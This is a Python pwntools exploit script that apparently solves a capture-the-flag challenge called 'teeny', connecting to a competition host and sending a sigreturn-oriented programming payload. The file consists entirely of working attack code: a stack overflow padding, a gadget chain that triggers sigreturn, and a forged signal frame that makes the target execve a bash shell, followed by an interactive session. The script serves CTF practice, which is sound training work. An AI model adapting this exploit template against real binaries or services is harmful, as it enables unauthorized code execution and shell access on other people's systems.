#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('teeny')

host = args.HOST or 'cybergon2023.webhop.me'
port = int(args.PORT or 5004)
#  context.log_level = "DEBUG"

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

gdbscript = '''
starti
'''.format(**locals())

def do_exploit():
    io = start()

    syscall_ret = 0x40015
    pop_rax_ret = 0x40018
    bin_bash_str = 0x40238
    SYS_execve = 59
    SYS_sigreturn = 15

    # Setup a sigreturn syscall to use the frame to reset the registers
    # to our wanted values to execve. There's no gadgets to set the registers
    # other ways.
    payload = b"AAAABBBB"
    payload += p64(pop_rax_ret) + p64(SYS_sigreturn) + p64(syscall_ret)

    frame = SigreturnFrame()
    frame.rax = SYS_execve
    frame.rdi = bin_bash_str
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = syscall_ret
    payload += bytes(frame)

    io.sendline(payload)
    io.interactive()

do_exploit()
